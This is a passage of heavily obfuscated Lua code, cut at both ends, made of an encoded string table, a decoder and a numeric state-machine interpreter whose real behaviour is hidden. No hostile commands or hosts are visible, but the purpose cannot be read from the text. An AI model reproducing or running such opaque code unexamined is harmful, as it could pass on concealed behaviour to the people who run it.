1\122\108\087\061\061","\043\048\081\118\051\089\083\117\118\087\061\061","\117\089\051\052\116\079\050\056","\104\077\048\115\081\087\061\061";"\122\080\098\109\104\050\082\061";"\065\047\106\089";"\079\047\108\048\111\109\066\099\116\097\061\061","\086\113\106\056\079\050\071\078";"\121\070\055\043\047\107\043\119","\076\072\068\073\055\043\054\100\119\088\074\079\047\100\076\067\084\051\083\102","\114\117\047\106\069\054\101\090\104\097\061\061","\050\069\051\068\090\047\053\043\052\049\113\049\098\100\120\088\050\066\074\061","\051\049\081\111\055\056\075\072\049\115\105\118\080\087\061\061";"\105\050\055\114\074\087\070\071\104\057\053\111\089\087\087\061","\073\082\057\118\080\053\061\061","\106\118\081\049\104\099\104\083\086\078\111\115\051\121\100\083\048\068\051\061";"\122\112\115\112\051\115\052\122\078\053\061\061","\068\089\049\112\068\097\081\077\077\072\110\068\078\102\111\083\083\103\074\061";"\048\068\088\049";"\086\071\122\116\106\097\061\061","\105\077\099\120\101\047\072\101\074\053\061\061","\057\070\057\043\072\054\107\077","\086\118\088\052\048\113\104\081";"\083\084\065\061","\079\050\088\079\048\068\099\056\048\068\080\089\066\068\077\078","\047\122\048\102\067\122\102\090\075\078\073\077\054\089\070\111\083\051\109\054\118\051\061\061","\043\050\071\097\065\050\111\067","\100\099\081\081","\104\056\103\068\053\088\072\079\072\108\073\098\079\051\061\061","\087\100\098\101\101\068\048\108\115\097\061\061";"\104\121\080\100\043\068\111\069","\086\101\104\119\049\101\108\117\048\051\061\061";"\106\050\071\080\048\051\061\061","\056\120\053\061","\072\111\114\070\080\103\076\083\066\067\115\050\098\087\089\050\067\099\077\079";"\120\119\087\081\104\057\069\083\120\087\061\061";"\070\108\069\113\117\053\061\061","\120\087\061\061";"\053\055\118\085\115\053\061\061";"\120\076\067\088\089\116\120\113\087\101\113\082\087\108\090\061";"\086\068\111\100\048\068\097\061","\097\048\089\106\106\114\118\056";"\107\122\111\102","\075\117\082\120\071\120\081\049\076\051\061\061","\075\120\114\117\119\056\122\114\099\081\075\049\052\105\102\067\079\087\119\047\087\072\105\114\073\113\086\061";"\114\069\049\085\109\073\120\048";"\048\099\067\118\104\079\113\087","\106\069\090\089\103\090\116\112","\065\075\104\081\106\118\088\051","\104\118\054\105\048\113\072\061","\104\122\047\056\048\113\072\061","\048\043\086\061";"\118\075\048\097";"\089\079\081\104\072\078\118\107","\099\065\120\106\052\079\065\061","\115\097\051\051\110\112\077\056\107\053\061\061";"\048\073\072\061","\079\121\048\086\069\120\054\106\113\087\061\061","\104\121\077\052\104\051\061\061";"\065\121\098\049\065\121\077\115"}for I,x in ipairs({{-383148+383149,-802731-(-802873)};{359468-359467;-943398-(-943485)};{-571506+571594,385018-384876}})do while x[-90659+90660]<x[200104-200102]do c[x[-1048576+1048577]],c[x[725432-725430]],x[-227495+227496],x[401710-401708]=c[x[103523+-103521]],c[x[595250+-595249]],x[-308650+308651]+(980607-980606),x[-1001983+1001985]-(-205926+205927)end end local function I(I)return c[I+(-271934-(-293865))]end do local I=string.len local x=c local o=string.sub local T=math.floor local V={y=454372-454318,v=-342955+342993,["\048"]=907031-907004,U=-768824+768834,u=32799-32737,O=433133+-433107,G=759480+-759423,f=-324841-(-324842),j=-402907-(-402924),g=391607-391596;["\043"]=-871390-(-871419);["\054"]=-341419+341468;K=-828487-(-828538);B=551729+-551710,W=397484+-397452;V=198146-198118,["\053"]=972606-972606;m=-995583+995627;r=-433965+433996,q=522471-522416;["\052"]=-219239+219284;["\049"]=943933+-943887,["\051"]=-390188+390204,["\056"]=-209190+209240,E=759520-759480,o=686197+-686184;Z=-829934-(-829946),I=61154+-61151;["\057"]=36835-36833,t=752730-752695;L=-335850+335910,J=610839-610803;w=730871+-730837;["\050"]=-73164-(-73186),x=160371-160357;Y=-70370+70390,k=-267176+267194;D=679861+-679855,h=-255400+255425,A=-316650+316674,a=-945597+945645,p=-667003-(-667061),c=891008-891004;i=-297850-(-297897),Q=123593-123556,e=962558+-962495,P=7136+-7083,H=-735151-(-735159);d=-818840-(-818873);N=-653325-(-653364),b=610483+-610422,l=26273+-26258,s=886063-886011,z=-388117-(-388140),M=-345259+345264;["\047"]=690174-690165,C=-927570-(-927613);F=809529+-809522;R=-759864+759920;["\055"]=-252200+252242;S=488175+-488134,n=-697270+697329,X=517296+-517275,T=579954+-579924}local U=table.concat local L=string.char local O=type local r=table.insert for c=612852-612851,#x,-599474-(-599475)do local s=x[c]if O(s)=="\115\116\114\105\110\103"then local O=I(s)local q={}local R=561329+-561328 local F=-411309-(-411309)local B=-34593-(-34593)while R<=O do local c=o(s,R,R)local I=V[c]if I then F=F+I*(-155109+155173)^((-640945-(-640948))-B)B=B+(-107170-(-107171))if B==-637876+637880 then B=-790072+790072 local c=T(F/(542-(-64994)))local I=T((F%(-138534-(-204070)))/(-380908+381164))local x=F%(-694326+694582)r(q,L(c,I,x))F=371756-371756 end elseif c=="\061"then r(q,L(T(F/(656820+-591284))))if R>=O or o(s,R+(783352+-783351),R+(-687157+687158))~="\061"then r(q,L(T((F%(661554-596018))/(150181-149925))))end break end R=R+(-876730-(-876731))end x[c]=U(q)end end end return(function(c,o,T,V,U,L,O,E,e,x,w,P,b,m,F,s,R,K,W,r,q,B)R,W,E,e,m,B,s,r,P,q,w,b,F,K,x=-411501+411501,function(c,I)local o=F(I)local T=function(T,V,U,L,O)return x(c,{T;V,U;L,O},I,o)end return T end,function(c,I)local o=F(I)local T=function(T,V,U,L)return x(c,{T;V,U;L},I,o)end return T end,function(c,I)local o=F(I)local T=function(T,V,U)return x(c,{T;V,U},I,o)end return T end,function(c)s[c]=s[c]-(-382379-(-382380))if 865339-865339==s[c]then s[c],r[c]=nil,nil end end,function(c)local I,x=33058-33057,c[-521263-(-521264)]while x do s[x],I=s[x]-(-199653-(-199654)),I+(234600-234599)if s[x]==1038784+-1038784 then s[x],r[x]=nil,nil end x=c[I]end end,{},{},function(c,I)local o=F(I)local T=function(T)return x(c,{T},I,o)end return T end,function()R=(-309097-(-309098))+R s[R]=144164+-144163 return R end,function(c,I)local o=F(I)local T=function()return x(c,{},I,o)end return T end,function(c,I)local o=F(I)local T=function(...)return x(c,{...},I,o)end return T end,function(c)for I=122085-122084,#c,811577+-811576 do s[c[I]]=s[c[I]]+(-147749+147750)end if T then local x=T(true)local o=U(x)o[I(-648116+626304)],o[I(-29793+7998)],o[I(936499-958398)]=c,B,function()return-289449+291113 end return x else return V({},{[I(-973472-(-951677))]=B;[I(-744439+722627)]=c,[I(-150447-(-128548))]=function()return 895612+-893948 end})end end,function(c,I)local o=F(I)local T=function(T,V,U,L,O,r)return x(c,{T,V;U,L,O,r},I,o)end return T end,function(x,T,V,U)local G,Y,M,n,b,s,C,k,Z,i,A,X,B,y,t,S,z,F,a,d,f,N,p,D,Q,v,l,R,H,h,O,g,u,J while x do if x<8516944-662389 then if x<4776634-407533 then if x<1850829-(-65890)then if x<2038929-918780 then if x<1527563-1018688 then if x<196518+275814 then if x<100387+199245 then O=I(-622602-(-600755))s=I(-974334+952542)x=c[O]O=c[s]s=I(568978-590770)c[s]=x x=12540511-(-659252)s=I(-194918+173071)c[s]=O s=r[V[-367978-(-367979)]]R=s()else G=r[b]O=G x=-174693+13747204 end else C=I(-251432+229512)a=q()r[a]=Y Z=-565262-(-565362)D=173604-173349 O=c[C]C=I(951380-973182)z=-852472-(-852474)x=O[C]C=-838906+838907 O=x(C,Z)C=q()r[C]=O Z=-191206-(-191206)x=r[p]O=x(Z,D)t=859643+-859642 Z=q()r[Z]=O D=-255720+255721 x=r[p]J=500208+-500208 f=r[C]O=x(D,f)D=q()r[D]=O O=r[p]f=O(t,z)M=402940-392940 z=I(782479-804345)O=-402796+402797 x=f==O f=q()h=I(529918-551729)O=I(-365739+343871)r[f]=x x=I(-87239-(-65314))Q=c[h]N=r[p]x=A[x]l={N(J,M)}h=Q(o(l))Q=I(-284882-(-263016))n=h..Q t=z..n z=I(587852-609715)x=x(A,O,t)t=q()n=W(2807989-(-586162),{p,a;g,F,R,v,f;t,C;D;Z,y})r[t]=x O=c[z]z={O(n)}x={o(z)}z=x x=r[f]x=x and 9257594-(-27297)or 11033329-1952 end else if x<58913-(-853754)then if x<754423+37931 then g=g+i d=g<=y k=not X d=k and d k=g>=y k=X and k d=k or d k=-985023+7562376 x=d and k d=13126129-(-354219)x=x or d else x=r[p]u=-356843+356849 S=-75810+75811 H=x(S,u)u=I(-1007318-(-985471))x=I(925350-947197)c[x]=H S=c[u]u=-216935+216937 x=S>u x=x and-889340+12763495 or 9937295-290409 end else X=421165+24773053213938 i=I(840122-862011)a=I(-12424-9376)v=33481364967898-(-616435)g=F(i,X)y=R[g]k=I(-604949-(-583090))X=F(k,v)v=I(-258664+236853)i=R[X]Z=14182414878906-54562 k=c[v]v=k(p)u=F(a,Z)k=R[u]X=v..k D=I(-762168+740242)g=i..X B[y]=g i=-173797+173798.5 g=I(81878-103715)u=-515440+27229850419327 X=-210407+34127778099726 y=c[g]g=y(i)k=-89123+17414476438397 i=I(-983143-(-961214))g=F(i,X)Z=-879547+586281807325 y=R[g]X=I(991419-1013311)i=F(X,k)v=I(-7809-14048)g=R[i]B[y]=g g=I(383136-404973)X=I(-850746+828945)i=-910012+910013 y=c[g]g=y(i)i=c[X]f=11344428183193-(-391852)k=F(v,u)X=R[k]p=nil v=505520+9950668647811 k=I(-260017-(-238183))x=12688227-(-642612)g=i[X]X=F(k,v)i=R[X]y=g[i]v=-360811+28430330259672 k=-376684+17438099767004 X=I(-766346-(-744503))i=F(X,k)g=R[i]i=true y[g]=i k=I(-555889+533961)i=I(-13129-8672)g=c[i]X=F(k,v)i=R[X]y=g[i]v=-366571+356493531447 k=I(918013-939837)a=I(-218369-(-196518))X=F(k,v)i=R[X]v=-138020+17965322853503 k=I(-707446+685574)g=y[i]X=F(k,v)v=21607565421349-(-713590)i=R[X]X=false b[i]=X k=I(-779099-(-757239))X=F(k,v)i=R[X]X=false G[i]=X k=I(1009727+-1031553)v=7487430092121-(-144868)X=F(k,v)i=R[X]X=false v=I(681958-703798)B[i]=X X=I(-914441-(-892604))i=c[X]k=-918588+918589 X=i(k)k=c[v]t=29072446166150-(-939325)u=F(a,Z)v=R[u]X=k[v]a=-954046+954046 v=981630+-981630 u=488751+-488751 Z=820857+-820857 k=X(v,u,a,Z)a=I(-1037806-(-1015935))u=c[a]Z=F(D,f)a=R[Z]D=7108388396878-591218 v=u[a]Z=I(-535921+514041)a=F(Z,D)u=R[a]X=v[u]Z=I(-221927+200056)f=I(-1038080+1016264)a=c[Z]D=F(f,t)Z=R[D]D=I(520752+-542601)u=a[Z]i=I(-631767-(-609843))f=24732249721098-(-479471)Z=F(D,f)a=R[Z]v=u[a]D=I(-422066-(-400172))u=388652+-388651 i=y[i]i=i(y,k,X,v,u)v=I(103587+-125427)Z=556593+24954520984727 a=I(-397356+375434)i=I(-323690+301766)k=c[v]u=F(a,Z)a=-264936-(-264936)v=R[u]X=k[v]v=57122+-57122 t=1896286924389-993151 u=-881275-(-881275)f=-120036+22119756735836 Z=285161+-285161 k=X(v,u,a,Z)a=I(407405+-429276)i=g[i]u=c[a]Z=F(D,f)D=199078+476755720214 a=R[Z]Z=I(-253480+231610)v=u[a]a=F(Z,D)Z=I(591300-613171)f=I(857787+-879651)u=R[a]X=v[u]a=c[Z]D=F(f,t)f=-858171+34282402288882 Z=R[D]D=I(-489822-(-468015))u=a[Z]Z=F(D,f)a=R[Z]v=u[a]u=-592690+592691 i=i(g,k,X,v,u)v=I(-273128+251288)k=112803+-112801 X=I(750443-772280)i=c[X]a=I(-446446+424548)Z=-18593+24958816658285 D=I(-42062-(-20193))X=i(k)i=I(824406-846330)k=c[v]u=F(a,Z)v=R[u]f=22989513900222-(-135908)u=370292-369835 a=800057-800057 X=k[v]Z=837690-837434 v=-306025-(-306025)k=X(v,u,a,Z)a=I(-1012270-(-990399))t=290601+13036697043012 u=c[a]Z=F(D,f)a=R[Z]v=u[a]D=865531+33758398563796 Z=I(-992959+971154)a=F(Z,D)f=I(-339820-(-317930))u=R[a]X=v[u]Z=I(-329322+307451)a=c[Z]D=F(f,t)Z=R[D]u=a[Z]D=I(-6304+-15538)i=y[i]f=14724671241593-247784 Z=F(D,f)a=R[Z]v=u[a]D=I(714998+-736789)u=104484-104483 i=i(y,k,X,v,u)a=I(-31636-(-9760))Z=551217+4357376747177 v=I(-188838+166998)k=c[v]u=F(a,Z)v=R[u]u=-130852+131309 X=k[v]Z=688693-688437 f=31010609767137-(-478703)v=994367+-994367 a=-871419-(-871419)k=X(v,u,a,Z)a=I(884045-905916)u=c[a]Z=F(D,f)D=623987+7878283564854 a=R[Z]Z=I(407597+-429394)v=u[a]t=-727351+5048888863637 a=F(Z,D)f=I(-1042368+1020447)i=I(-53573-(-31649))u=R[a]Z=I(28659-50530)X=v[u]a=c[Z]D=F(f,t)Z=R[D]D=I(-514577-(-492783))f=23415802981276-431725 i=g[i]u=a[Z]Z=F(D,f)a=R[Z]v=u[a]u=-757750-(-757751)i=i(g,k,X,v,u)D=1024512+15837100447645 v=13707807177364-723126 k=I(-22072-(-224))u=I(924029+-945830)y=nil X=F(k,v)i=R[X]X=true G[i]=X v=c[u]Z=I(205414+-227264)a=F(Z,D)u=R[a]Z=456430+26782085442176 a=I(-542513+520646)k=v[u]u=F(a,Z)a=-531568+9757390258159 v=R[u]X=k[v]u=I(613092-634996)v=F(u,a)k=R[v]v=I(-547697+525851)i=X[k]u=-593138+3481177823644 k=F(v,u)X=R[k]Z=I(-33083-(-11168))u=I(807121-828922)k=true i[X]=k v=c[u]D=30582173634832-(-548401)a=F(Z,D)u=R[a]Z=11171550376821-(-488751)k=v[u]a=I(537649+-559514)u=F(a,Z)v=R[u]X=k[v]u=I(556081+-577964)a=28231681728536-129380 v=F(u,a)k=R[v]v=I(-737271+715344)i=X[k]u=1314301068806-966974 D=870267+7951299990898 k=F(v,u)X=R[k]k=true i[X]=k u=I(-30753+8952)Z=I(637556+-659385)v=c[u]a=F(Z,D)u=R[a]Z=20835521837601-(-364971)k=v[u]a=I(295977+-317786)u=F(a,Z)a=616243+12634031244995 v=R[u]X=k[v]u=I(384620+-406430)v=F(u,a)g=nil D=-1002175+11312216339430 Z=I(581261-603059)k=R[v]u=34379041759876-615795 i=X[k]v=I(564480-586354)k=F(v,u)X=R[k]k=true i[X]=k u=I(205502-227303)v=c[u]a=F(Z,D)u=R[a]a=I(980291-1002175)Z=-946493+11583881255777 k=v[u]u=F(a,Z)a=70562+27248104001406 v=R[u]X=k[v]u=I(-495791+473939)v=F(u,a)u=486511+26739134428375 k=R[v]v=I(-822840-(-800953))a=I(-514770-(-492847))i=X[k]k=F(v,u)Z=5697447674960-(-315498)X=R[k]k=true i[X]=k v=I(-264040+242239)k=c[v]u=F(a,Z)v=R[u]a=14597964703647-(-888188)u=I(-454190+432290)X=k[v]v=F(u,a)u=6167760915653-(-346539)k=R[v]i=X[k]v=I(-759800+737898)k=F(v,u)X=R[k]k=true i[X]=k end end else if x<815565-(-840442)then if x<-337834+1962927 then if x<232743+1305389 then O={}x=true r[V[-263528+263529]]=x x=c[I(802884-824698)]else Q=x l=137445-137444 N=z[l]l=false h=N==l n=h x=h and-558513+8631463 or-478575+15693120 end else R=r[V[-514669-(-514672)]]F=159014-159013 s=R~=F x=s and 9338045-(-802425)or 10486881-1024832 end else if x<72546+1674141 then B=I(737157-758968)O=I(455982+-477900)d=I(210688-232551)x=c[O]y=w(-429677+7888721,{})s=r[V[-714742+714746]]F=c[B]p=c[d]d={p(y)}p=480945-480943 G={o(d)}b=G[p]B=F(b)F=I(706870+-728738)R=s(B,F)s={R()}O=x(o(s))R=r[V[911745-911740]]x=R and 17450230-900860 or 5254913-706678 s=O O=R else x=O and 625459+1112322 or 140004+7840272 end end end else if x<251112+3222920 then if x<-962878+4322310 then if x<878843+1876101 then if x<902588+1096504 then x=736759+12217237 h=204774+-204773 Q=z[h]n=Q else O={R}x=c[I(-596931-(-575090))]end else x=true x=7450180-244584 end else if x<2771640-(-631732)then R=r[V[-834042+834043]]b=-1031294-(-1031296)B=-231655+231656 F=R(B,b)R=443694+-443693 s=F==R O=s x=s and 511984+1401930 or-542833+10071956 else x=806713+13717123 end end else if x<705782+3162967 then if x<3225682-(-487087)then if x<360235+3220481 then v=#k u=-72226+72226 A=v==u x=832826+10648613 else x=6644779-357739 H=i==X Y=H end else i=1005951+-1005886 y=q()r[y]=O g=41569+-41566 x=r[p]O=x(g,i)g=q()r[g]=O x=598323+-598323 i=x k=I(-696822+674959)O=c[k]x=870203-870203 A=E(16327827-998079,{})X=x k={O(A)}x={o(k)}k=x O=-1000767+1000769 x=k[O]A=x O=I(-114433-(-92515))x=c[O]v=r[F]S=I(652226-674037)H=c[S]S=H(A)H=I(-395928-(-374060))Y=v(S,H)v={Y()}O=x(o(v))v=q()r[v]=O Y=r[g]H=Y Y=729271+-729270 S=Y x=643956+8114071 Y=-103587+103587 u=S<Y O=851962+-851961 Y=O-S end else if x<-36577+4069509 then x=true x=x and 4350948-(-998591)or-56162+7261758 else D=m(D)a=m(a)x=642868+8115159 z=nil f=m(f)t=m(t)C=m(C)Z=m(Z)end end end end else if x<5796402-(-544561)then if x<602355+4751017 then if x<196902+4805029 then if x<3881360-(-966590)then if x<261992+4286690 then r[V[-150693+150698]]=O x=8349023-368747 s=nil else A=v Z=A k[A]=Z x=15567419-(-211367)A=nil end else s=r[V[-877691+877692]]O=#s s=323434-323434 x=O==s x=x and 6516007-590450 or 15091182-436270 end else if x<113060+4933385 then H=r[R]Y=H x=H and-497647+4087900 or 6361954-74914 else x=15046444-522608 end end else if x<6057063-10080 then if x<5690773-(-270184)then if x<6376324-454318 then x=r[V[369772-369771]]d=115108+-115108 y=-635637-(-635892)p=x(d,y)x=13899529-(-37025)R=F s[R]=p R=nil else F=-687669+687674 R=r[V[-214887+214889]]s=R*F R=872315+10574531319548 O=s+R s=35184371329480-(-759352)x=O%s R=-752950-(-752951)r[V[-744053-(-744055)]]=x s=r[V[283180-283177]]O=s~=R x=733943+8728106 end else x=-595506+14051277 end else if x<6857574-552945 then r[R]=Y x=r[R]x=x and-1040512+7005494 or 2518380-(-598771)else O={}x=c[I(758520+-780432)]end end end else if x<7734703-524592 then if x<6885895-5920 then if x<-870715+7473620 then if x<6219049-(-307882)then g=I(423353-445230)y=c[g]x=912892+2871927 O=y else d=g x=649907-136868 S=I(-179110+157214)H=c[S]S=I(-1063167-(-1041344))Y=H[S]H=Y(s,d)Y=r[V[-721008-(-721014)]]S=Y()v=H+S S=161893+-161892 d=nil A=v+G v=620979-620723 k=A%v v=F[R]G=k H=G+S Y=B[H]A=v..Y F[R]=A end else g=I(-899772+877942)x=13474171-143332 i=5212102720752-846330 v=149605+27583121595379 y=F(g,i)p=R[y]X=363819+18700857947869 i=I(-195316-(-173413))g=F(i,X)i=I(-822434-(-800633))y=R[g]B[p]=y y=I(-128676+106839)p=c[y]g=259688+-259685 y=p(g)g=c[i]k=I(-174885+153027)X=F(k,v)i=R[X]k=13883905081557-(-405933)y=g[i]X=I(613389-635188)i=F(X,k)g=R[i]p=y[g]y=I(-600755+578965)y=p[y]y=y(p)end else if x<7685033-491247 then i=I(1011327+-1033135)X=16466446-888380 i=d[i]i=i(d,X)x=14156497-996159 X=779320+-779065 g=i==X p=g else x=e(-818745+8948017,{B})H={x()}O={o(H)}x=c[I(856379+-878207)]end end else if x<8563105-918716 then if x<-70434+7527271 then if x<7497170-279913 then v=#k u=697910+-697910 A=v==u x=A and 9689287-(-971390)or 106147+11375292 else x=-154085+11128116 v=564466-564465 A=p+v p=A end else O=677749+4140319 F=13960587-(-430637)R=I(-948020-(-926141))s=R^F x=O-s O=I(-1039872+1018047)s=x x=O/s O={x}x=c[I(-748407+726604)]end else if x<8337845-564786 then x=c[I(-433581+411788)]O={}else x=r[V[-571122+571132]]R=r[V[907068+-907057]]s[x]=R x=r[V[537661-537649]]R={x(s)}O={o(R)}x=c[I(466606+-488433)]end end end end end else if x<992255+11259216 then if x<10568999-603187 then if x<-756343+10121097 then if x<8465434-(-130276)then if x<-857083+8958276 then if x<7938861-(-67042)then x=r[V[850746+-850739]]x=x and 12154066-(-728759)or 81251+12184596 else l=1021248+-1021246 N=z[l]l=r[t]x=14776419-(-438126)h=N==l n=h end else x=366891+12832872 end else if x<8798379-(-500528)then if x<8967935-(-113700)then a=not u Y=Y+S O=Y<=H O=a and O a=Y>=H a=u and a O=a or O a=-842042+1338697 x=O and a O=4292131-(-748151)x=x or O else n=r[R]O=n x=n and 1480397-(-93539)or 12272791-(-484079)end else k=I(463854+-485675)X=c[k]x=13089840-891580 k=I(1020736+-1042613)i=X[k]y=i end end else if x<1041600+8746632 then if x<10467523-844986 then if x<188582+9335930 then R=r[V[-526384+526387]]F=-446450-(-446638)s=R*F x=556401+1070272 R=754423+-754166 O=s%R r[V[-538545+538548]]=O else R=r[V[-435758+435760]]F=r[V[-767288+767291]]x=932797+981117 s=R==F O=s end else u=I(-737933-(-716086))x=c[u]u=I(-952669-(-930877))c[u]=x x=3855446-410605 end else if x<-691765+10560638 then y=I(-573182-(-551345))p=c[y]i=-848378+7264085970023 A=-1017664+5245389904469 X=5078953404365-(-420525)g=.3 y=p(g)g=I(-49768-(-27937))y=F(g,i)p=R[y]i=I(211156-233063)g=F(i,X)y=R[g]k=I(-200175-(-178342))i=I(213927+-235728)B[p]=y g=c[i]X=F(k,A)i=R[X]y=g[i]k=34690435909399-133348 X=I(-873231-(-851322))i=F(X,k)X=-466606+17723723898664 g=R[i]i=I(850497-872315)p=y[g]g=F(i,X)y=R[g]D=I(-554872-(-532977))g=false p[y]=g g=I(831482+-853319)i=636664-636660 p=536497+-536497 a=I(-327722+305921)y=c[g]g=y(i)f=21839501489364-42337 g=I(336298+-358087)y=c[g]u=c[a]Z=F(D,f)a=R[Z]x=13992779-111523 D=17330721102738-(-828282)Z=I(277993+-299898)v=u[a]a=F(Z,D)u=R[a]a=I(-368105-(-346219))A=v[u]Z=224807+245894156990 u=F(a,Z)v=R[u]k=A[v]v=I(-475631+453796)v=k[v]A={v(k)}k={y(o(A))}i=k[336746+-336744]g=k[691381+-691380]X=k[459313-459310]else d=I(-937405+915509)x={}r[V[402668+-402666]]=x O=r[V[721654+-721651]]b=311338+35184371777494 x=22496-(-490543)B=O p=-337066+337321 O=R%b r[V[994367+-994363]]=O G=R%p p=-421291-(-421293)g=-48160-(-48161)b=G+p r[V[466542+-466537]]=b p=c[d]d=I(943489-965374)G=p[d]p=G(s)G=I(-989917-(-967998))F[R]=G G=-269672+269815 d=-571121-(-571122)i=g y=p g=33569-33569 X=i<g g=d-i end end end else if x<9989563-(-925693)then if x<-698422+10973324 then if x<9517307-(-634804)then if x<10695185-559921 then O=I(-661108+639255)s=I(-336682+314769)x=c[O]O=x(s)x=c[I(-634711-(-612915))]O={}else R=r[V[699702+-699699]]F=-971550-(-971582)s=R%F y=-117538-(-117540)B=r[V[-856379+856383]]p=r[V[182182+-182180]]i=945098-945085 A=r[V[-391657-(-391660)]]k=A-s A=-292937-(-292969)X=k/A x=13835399-(-819513)g=i-X d=y^g G=p/d b=B(G)B=4295106276-138980 F=b%B b=-179428-(-179430)B=b^s R=F/B B=r[V[-665141+665145]]d=822714-822713 p=R%d d=4294939999-(-27297)G=p*d b=B(G)B=r[V[303917-303913]]G=B(R)R=nil F=b+G b=229605-164069 B=F%b p=-350637-(-416173)G=F-B b=G/p p=876795+-876539 G=B%p i=-316266-(-316522)y=999167+-998911 d=B-G p=d/y F=nil y=-334698-(-334954)s=nil B=nil d=b%y g=b-d y=g/i g={G,p,d,y}p=nil G=nil y=nil b=nil d=nil r[V[397613-397612]]=g end else b=q()R=q()s=T p=I(685007-706870)x=true F=I(617516-639412)B=q()r[R]=x d=w(830520-(-538097),{b})O=c[F]F=I(148261+-170134)x=O[F]F=q()r[F]=x x=P(-657332+10749160,{})r[B]=x x=false r[b]=x G=c[p]p=G(d)x=p and-63459-(-509936)or 907516+12664995 O=p end else if x<-459566+11147078 then v=q()A={}r[v]=A Z={}u=w(5183358-229095,{v;y,g;b})z=I(833274+-855106)f=I(742724-764536)h=nil A=q()r[A]=u k=nil i=nil b=m(b)a=q()d=nil u={}C=I(-850568-(-828730))r[a]=u G=nil u=c[C]t=r[a]D={[f]=t,[z]=h}i=1869440858967-(-707446)C=u(Z,D)B=nil R=C d=I(-518104-(-496303))p=nil u=K(-416365+11262904,{a;v;X,y;g;A})p=c[d]y=m(y)g=m(g)A=m(A)F=u g=I(14149-36065)a=m(a)y=F(g,i)X=m(X)v=m(v)d=R[y]g=-861243+20185889435050 X=26670412532621-(-808313)y=I(59885-81763)G=p[d]d=F(y,g)v=I(467630+-489431)p=R[d]i=I(112234-134116)d=I(-19745+-2075)y=-799993+2409550986685 b=G[p]p=F(d,y)G=R[p]B=b[G]y=I(43361+-65162)d=c[y]g=F(i,X)y=R[g]Z=-776056+11998358078238 i=-564337+22451553529374 p=d[y]g=I(99883-121700)y=F(g,i)g=-223015+8491409704459 d=R[y]G=p[d]y=I(202321-224231)d=F(y,g)p=R[d]b=G[p]X=32825288499505-(-808505)y=I(275369+-297170)i=I(-574801-(-552945))d=c[y]g=F(i,X)i=523952+5568594515346 y=R[g]g=I(-473647+451843)p=d[y]y=F(g,i)d=R[y]G=p[d]g=477359+23552171445503 y=I(232698-254504)d=F(y,g)p=R[d]y=I(-122340+100423)g=28583878707454-(-958206)d=true b[p]=d d=F(y,g)y=I(-372140+350243)p=R[d]d=true G[p]=d g=-1019008+4962987187854 i=30155886089761-419949 d=F(y,g)g=780634944848-815737 y=I(-879125-(-857211))p=R[d]X=714678+9570552232731 d=true B[p]=d d=F(y,g)p=R[d]g=I(-459374+437499)y=F(g,i)d=R[y]B[p]=d d=I(171609-193446)y=410606-410605 i=662517+15880051793360 p=c[d]d=p(y)g=6286949521449-(-720566)y=I(-366891+345055)d=F(y,g)g=I(559924-581746)p=R[d]y=F(g,i)d=R[y]y=I(-155129-(-133284))B[p]=d i=I(301413-323306)d=c[y]g=F(i,X)a=I(600627+-622489)y=R[g]p=d[y]A=c[v]u=F(a,Z)v=R[u]k=A[v]a=24646347572917-(-660212)u=I(-970826-(-948925))v=F(u,a)A=R[v]u=33205405585198-71266 v=I(-964497-(-942589))X=k[A]A=F(v,u)v=24135232517388-990527 k=R[A]i=X[k]A=I(-258270-(-236455))k=F(A,v)X=R[k]k=I(577737-599667)d=I(-474030-(-452142))g=i[X]A=8178940426829-(-648052)X=F(k,A)i=R[X]d=p[d]X=-1015359+16593425 y=g[i]i=I(-146277+124469)d=d(p,y)y=x i=d[i]i=i(d,X)X=1028224+-1028219 g=i==X p=g x=g and-1011583+14171921 or 75554+7115193 else x=r[V[-838009-(-838010)]]R=T[902460+-902458]s=T[-546480-(-546481)]F=x x=F[R]x=x and 12111185-(-1026112)or 10336283-400108 end end else if x<11540845-(-232935)then if x<279209+11018590 then if x<10967720-(-33569)then y=nil k=nil x=14615071-733815 else Q=r[R]n=Q x=Q and 900028+1058431 or 12467613-(-486383)end else v=-1023295-(-1023296)u=#k Z=211112-211111 x=6794927-(-420397)A=B(v,u)v=G(k,A)A=nil u=r[X]C=v-Z a=p(C)u[v]=a v=nil end else if x<11684428-(-494703)then S=I(-817401+795590)x=c[S]a=I(773560+-795352)u=c[a]S=x(u)x=I(309674+-331521)c[x]=S x=2471403-(-973438)else O=y x=g x=y and 2782260-(-1002559)or-627123+6980725 end end end end else if x<412141+13056276 then if x<114148+13033028 then if x<454062+12474467 then if x<-98915+12862250 then if x<11509016-(-964542)then R=331946+-331945 x={}s=x F=r[V[-1003446-(-1003455)]]B=F F=482736-482735 b=F F=-599411+599411 x=930813+13005741 G=b<F F=R-b else r[R]=O x=4954359-621683 end else F=-288681-(-288681)s=I(417453+-439306)x=c[s]R=r[V[-487407+487415]]s=x(R,F)x=12377242-111395 end else if x<-649012+13743722 then r[R]=n J=20641+-20640 l=r[D]N=l+J h=z[N]Q=i+h h=-228711-(-228967)x=Q%h i=x x=-146277+4478953 N=r[Z]h=X+N N=947389+-947133 Q=h%N X=Q else x=65378+2563822 end end else if x<624819+12585800 then if x<895932+12295010 then if x<-965758+14130594 then x=y x=p and-519728+10351452 or-586930+7263614 else y=X a=I(-432496-(-410605))A=I(-161125+139264)Z=6284801765920-(-926909)u=F(a,Z)v=R[u]A=k[A]A=A(k,v)x=A and 8047126-829242 or 10039762-(-934269)end else x=true x=x and-1035648+1057664 or 491887+5836626 end else if x<12539788-(-847994)then R=nil G=nil O={}B=nil x=c[I(-325435-(-303529))]d=nil b=nil F=nil else d=nil F=m(F)g=m(g)v=m(v)R=m(R)p=m(p)d=I(-639472-(-617651))p=I(-353738-(-331818))R=nil y=m(y)k=nil b=m(b)i=nil G=nil X=nil B=m(B)A=nil F=nil G=I(928861-950781)A=845306+-845305 b=c[G]G=I(-1002012-(-980158))B=b[G]y=I(-811321+789425)g=q()b=q()X=q()r[b]=B G=c[p]p=I(-801657+779855)B=G[p]v=-963454-(-963710)i={}p=c[d]d=I(-87843+65962)G=p[d]d=c[y]y=I(53735-75554)p=d[y]d=-477039-(-477039)y=q()r[y]=d d=167909+-167907 u=v r[g]=d d={}v=-334826+334827 k={}r[X]=i i=-481455-(-481455)x=14827045-(-951741)a=v v=-562993+562993 C=a<v v=A-a end end end else if x<15047556-419437 then if x<13011194-(-919356)then if x<-322794+14201139 then if x<-966590+14524115 then p=nil x=255080+2374120 B=nil G=nil else p=I(-434381-(-412461))d=I(287853-309674)G=O O=c[p]p=I(469765-491567)x=O[p]p=q()r[p]=x O=c[d]d=I(132964+-154808)x=O[d]d=x 